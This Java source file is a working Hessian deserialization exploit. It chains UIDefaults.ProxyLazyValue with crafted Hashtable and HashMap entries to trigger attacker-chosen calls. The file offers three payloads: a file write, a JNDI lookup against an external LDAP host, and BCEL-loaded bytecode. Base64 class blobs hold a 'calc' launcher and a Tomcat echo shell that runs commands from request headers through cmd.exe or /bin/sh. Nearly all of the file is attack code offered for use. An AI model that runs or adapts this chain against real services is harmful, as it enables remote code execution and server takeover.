package hessian;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.caucho.hessian.io.SerializerFactory;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import util.utils;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;

public class jdk_hessian {
    static  SerializerFactory sf = new SerializerFactory();
    public static void main(String[] args) throws Exception {

        String JavaWrapper_calc = "yv66vgAAADQAIwoABgAWCgAXABgIABkKABcAGgcAGwcAHAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAKTGJjZWxUZXN0OwEABV9tYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3YBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwcAHQEAClNvdXJjZUZpbGUBAA1iY2VsVGVzdC5qYXZhDAAHAAgHAB4MAB8AIAEABGNhbGMMACEAIgEACGJjZWxUZXN0AQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAACAAEABwAIAAEACQAAAC8AAQABAAAABSq3AAGxAAAAAgAKAAAABgABAAAAAwALAAAADAABAAAABQAMAA0AAAAJAA4ADwACAAkAAAA4AAIAAQAAAAq4AAISA7YABFexAAAAAgAKAAAACgACAAAABQAJAAYACwAAAAwAAQAAAAoAEAARAAAAEgAAAAQAAQATAAEAFAAAAAIAFQ==";

        String JavaWrapper_echo = "yv66vgAAADQBDgoAAwCCCgADAIMHAIQKAA4AhQcAhgoADgCHCgAFAIgKAIkAigoAiQCLCACMCgAOAI0KAA4AjggAjwcAkAcAaAkAEgCRCgAOAJIHAJMKABIAlAoAlQCWCACXCgAOAJgHAJkIAJoIAJsKAJwAnQoAnACeCACfCgBKAKAHAHsKAJwAoQgAogoALwCjCACkCAClBwCmCACnCACoCACpCACqBwCrCwApAKwLACkArQgArggArwgAsAcAsQgAsgoALwCICgAvALMKALQAtQoAtgC3CgAvALgIALkKALoAuwoALwC8CAC9CAC+CAC/CADACADBBwDCBwDDCgA/AMQKAD8AxQoAxgDHCgA+AMgIAMkKAD4AygoAPgDLCgAvAMwKAEoAzQoAFwDOBwDPAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMSmF2YVdyYXBwZXJfZWNobzsBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyNQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAEdmFyMAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjEBABJMamF2YS9sYW5nL1N0cmluZzsBAAR2YXIyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjMBABFMamF2YS9sYW5nL0NsYXNzOwEADVN0YWNrTWFwVGFibGUHANAHAJAHAIYBAApFeGNlcHRpb25zAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBAAR2YXI0AQAEdmFyNgEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAltCBwCEBwCZAQAFX21haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFdmFyMTQBAAFjAQAFdmFyMTIBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAFdmFyMTMBAAV2YXIxMAEABXZhcjExAQAEdmFyOQEAAUkBAAR2YXI4AQAQTGphdmEvdXRpbC9MaXN0OwEAEkxqYXZhL2xhbmcvVGhyZWFkOwEABGFyZ3YBAAFaAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAcAcA0QcAsQcAqwEAClNvdXJjZUZpbGUBABVKYXZhV3JhcHBlcl9lY2hvLmphdmEMAEsATAwA0gDTAQAQamF2YS9sYW5nL09iamVjdAwA1ADVAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDADWANMMAEsA1wcA0AwA2ADZDADaANsBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsMANwA3QwA3gDfAQAIc2V0Qnl0ZXMBAA9qYXZhL2xhbmcvQ2xhc3MMAOAAXQwA4QDiAQARamF2YS9sYW5nL0ludGVnZXIMAEsA4wcA5AwA5QDmAQAHZG9Xcml0ZQwA5wDiAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAE2phdmEubmlvLkJ5dGVCdWZmZXIBAAR3cmFwBwDRDADoAOkMAOoA6wEAB3RocmVhZHMMAFIAUwwA7ADtAQAEZXhlYwwA7gDvAQAEaHR0cAEABnRhcmdldAEAEmphdmEvbGFuZy9SdW5uYWJsZQEABnRoaXMkMAEAB2hhbmRsZXIBAAZnbG9iYWwBAApwcm9jZXNzb3JzAQAOamF2YS91dGlsL0xpc3QMAPAA8QwA2gDyAQADcmVxAQALZ2V0UmVzcG9uc2UBAAlnZXRIZWFkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAFRXRhZ3MMAPMA9AcA9QwA9gD5BwD6DAD7APwMAEsA/QEAB29zLm5hbWUHAP4MAP8BAAwBAQDtAQAGd2luZG93AQAHY21kLmV4ZQEAAi9jAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIMAEsAbAwBAgEDBwEEDAEFAQYMAEsBBwEAAlxBDAEIAQkMAQoA7QwBCwEMDABjAGQMAQ0A7QEAEEphdmFXcmFwcGVyX2VjaG8BABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAEGphdmEvbGFuZy9UaHJlYWQBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZ2V0U3VwZXJjbGFzcwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEKEkpVgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL3V0aWwvQmFzZTY0AQAKZ2V0RGVjb2RlcgEAB0RlY29kZXIBAAxJbm5lckNsYXNzZXMBABwoKUxqYXZhL3V0aWwvQmFzZTY0JERlY29kZXI7AQAYamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyAQAGZGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEABShbQilWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b0xvd2VyQ2FzZQEABXN0YXJ0AQAVKClM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";

        String JavaWrapper_mem = "";

        byte[] bytes="123321".getBytes();

        sf.setAllowNonSerializable(true);
        // 文件写入
        //        Object[] ags = new Object[]{"../webapps/ROOT/test.txt",bytes};
        Object[] ags = new Object[]{"test.txt",bytes};
        UIDefaults.ProxyLazyValue swingLazyValue = new UIDefaults.ProxyLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", ags);
        // jndi注入
        Object[] jndi_ags = new Object[]{"ldap://9eb6d262cc.ipv6.bypass.eu.org."};
        UIDefaults.ProxyLazyValue jndi_swingLazyValue = new UIDefaults.ProxyLazyValue("javax.naming.InitialContext", "doLookup", jndi_ags);
        // bcel加载字节码
        String bcel_code = "$$BCEL$$"+ Utility.encode(Base64.getDecoder().decode(JavaWrapper_calc),true);
        Object[] bcel_ags = new Object[]{new String[]{bcel_code}};
        UIDefaults.ProxyLazyValue bcel_swingLazyValue = new UIDefaults.ProxyLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", bcel_ags);

        utils.setFieldValue(bcel_swingLazyValue, "acc", null);
        Object[] keyValueList = new Object[]{"abc", bcel_swingLazyValue};
        UIDefaults uiDefaults1 = new UIDefaults(keyValueList);
        UIDefaults uiDefaults2 = new UIDefaults(keyValueList);
        Hashtable<Object, Object> hashtable1 = new Hashtable<Object, Object>();
        Hashtable<Object, Object> hashtable2 = new Hashtable<Object, Object>();
        hashtable1.put("a", uiDefaults1);
        hashtable2.put("a", uiDefaults2);

        HashMap<Object, Object> s = new HashMap<>();
        utils.setFieldValue(s, "size", 4);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 4);
        Array.set(tbl, 0, nodeCons.newInstance(0, hashtable1, hashtable1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, hashtable2, hashtable2, null));
        utils.setFieldValue(s, "table", tbl);


        ByteArrayOutputStream ser = new ByteArrayOutputStream();

        HessianOutput hessianOutput = new HessianOutput(ser);
        hessianOutput.setSerializerFactory(sf);
        hessianOutput.writeObject(s);
        hessianOutput.close();

        byte[] ser_bytes = ser.toByteArray();

        System.out.println(Base64.getEncoder().encodeToString(ser_bytes));

        HessianInput hessianInput=new HessianInput(new ByteArrayInputStream(ser_bytes));
        hessianInput.readHeader();
        hessianInput.readObject();

    }

}
